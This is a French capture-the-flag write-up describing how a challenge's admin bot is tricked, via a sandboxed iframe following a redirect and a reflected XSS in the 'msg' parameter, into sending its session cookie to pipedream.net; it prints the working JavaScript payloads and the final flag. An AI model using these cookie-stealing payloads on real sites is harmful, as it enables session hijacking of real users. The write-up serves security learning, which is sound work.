# Contexte

Dans ce challenge, on a accès au code source de l'application. En utilisant l'application de manière normale, on s'aperçoit de plusieurs choses.
- Si on possède un cookie de session, on est automatiquement redirigé vers notre page de profil
- Il y a une XSS sur la page de profil avec le paramètre `msg` qui est reflété sur la page

# Quoi faire?

En regardant le code source de l'application, on sait que si l'username est `admin` le flag est affiché sur la page. Cependant, seul une personne en local pour donner le nom d'utilisateur `admin`.
Alors on va s'intéresser à la page de report, qui sera notre moyen d'interagir avec le bot.

# Premère essai

Puisqu'on peut envoyer une page HTML au bot, on peut essayer de lui demander de charger la page d'accueil et en suivant la redirection, on aura le flag.
```html
<html>
  ...
</html>
<script>

async function fetchAdmin() {
  const response = await fetch("https://ctf.esna.bzh:30005", { redirect: 'follow' }) // Go sur la page d'accueil en suivant les redirect
  const data = await response.text(); // recup des données
  return btoa(data); // return des données en B64
}

fetchAdmin().then(res => {
  fetch("pipedream.net?c=" + res) // Envoie des données
});
</script>
```

Malheuresement, ça serait trop beau, on récupère seulement la page d'accueil, aucune redirection est faite.
On va devoir bypass le Same-Origin Policy (SOP)

# Bypass SOP
Alors en faisant des recherches, on apprend qu'on peut bypass SOP en utilisant une iframe (comme prévenu dans le chall, ça marche sur Chrome, pas sur Firefox).

```html
<html>
  ...
</html>
<script>
    f = document.createElement('iframe'); // création d'une iframe
    
    f.sandbox = 'allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts allow-top-navigation'; // ajout des attributs
    
    f.src = "https://ctf.esna.bzh:30005"; // donner la source pour afficher la page
    
    document.body.appendChild(f); // ajout de l'iframe à la page
  </script>
```
Effectivement, si on charge cette page-là sur notre navigateur, l'iframe suit bien la redirection vers la page de profile.
Chouette, c'est presque gagné

# XSS

Super, on a bypass SOP on a juste à récupérer les informations que l'on souhaite, et pour ça, on peut utiliser la XSS de la page profile, puisqu'elle est chargée.
Cependant l'url de l'iframe n'est pas modifié, on a toujours `https://ctf.esna.bzh:30005` et non `https://ctf.esna.bzh:30005/:id/profile?msg=test`.
En relisant le code, on s'aperçoit assez facilement que lorsqu'on charge la page d'accueil, on peut quand même passer le paramètre `msg` qui sera passé lors de la redirection vers la page de profile.

Parfait alors maitenant on a tous, alors on peut construire notre payload complète.
```html
<html>
  ...
</html>
<script>
    f = document.createElement('iframe'); // création d'une iframe
    
    f.sandbox = 'allow-forms allow-pointer-lock allow-popups allow-same-origin allow-scripts allow-top-navigation'; // ajout des attributs
    
    payload = "<script>fetch('https://pipedream.net/?c='.concat(document.cookie))</script>" // Payload pour exfiltrer les cookies
    
    f.src = "https://ctf.esna.bzh:30005?msg=" + payload // donner la source pour afficher la page
    
    document.body.appendChild(f); // Ajout de l'iframe à la page
  </script>
```

Super, ça marche chez moi, mais pas sur le bot.
Replongeons dans le code source du bot.
Le bot ne charge pas `ctf.esna.bzh` sur le port `30005`, mais `localhost` sur le port `3000`, on change donc la `src` de l'iframe pour `localhost:3000` 

Nice, on a récupéré les cookies de l'admin, on peut donc les utiliser dans notre navigateur et être redirigé vers la page de profile de l'admin et trouver le flag.
`ESNA{1fr4m3_c4n_l34d_t0_s3v3r4l_3xpl01t_!!}`
